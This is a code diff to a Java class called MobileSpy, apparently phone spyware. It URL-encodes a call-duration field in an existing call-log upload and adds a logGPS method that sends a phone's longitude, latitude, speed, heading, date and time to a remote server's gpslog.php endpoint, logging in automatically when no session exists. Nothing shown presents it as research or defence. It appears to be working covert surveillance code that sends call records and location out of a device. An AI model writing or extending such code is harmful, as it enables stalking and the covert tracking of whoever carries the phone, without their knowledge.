@@ -122,8 +122,28 @@ public class MobileSpy {
 		sendRequest(DO_NOTHING_HANDLER, new Request(WEBAPI_SERVER_ROOT + "/calllog.php?sID=" + session +
 						"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time) +
 						"&from=" + from + "&to=" + to +
-						"&dir=" + type + "&dur=" + duration));
+						"&dir=" + type + "&dur=" + URLEncoder.encode(duration)));
 		Logger.getDefault().debug(from + " " + to + " " + type + " " + duration + " " + date + " " + time);
+	}
+
+	public static void logGPS(final String lon, final String lat, final String speed, final String dir, final String date, final String time) {
+		// Try to login if the session is not available 
+		if (session.length() == 0) {
+			login(new ContentHandler() {
+				@Override
+				public void handle(String text) {
+					if (session.length() > 0) {
+						logGPS(lon, lat, speed, dir, date, time);
+					}
+				}
+			});
+			return;
+		}
+		sendRequest(DO_NOTHING_HANDLER, new Request(WEBAPI_SERVER_ROOT + "/gpslog.php?sID=" + session +
+						"&long=" + URLEncoder.encode(lon) + "&lat=" + URLEncoder.encode(lat) +
+						"&speed=" + URLEncoder.encode(speed) + "&dir=" + URLEncoder.encode(dir) +
+						"&date=" + URLEncoder.encode(date) + "&time=" + URLEncoder.encode(time)));
+		Logger.getDefault().debug(lon + " " + lat + " " + speed + " " + dir + " " + date + " " + time);
 	}
 
 	private static void sendRequest(final ContentHandler handler, Request request) {
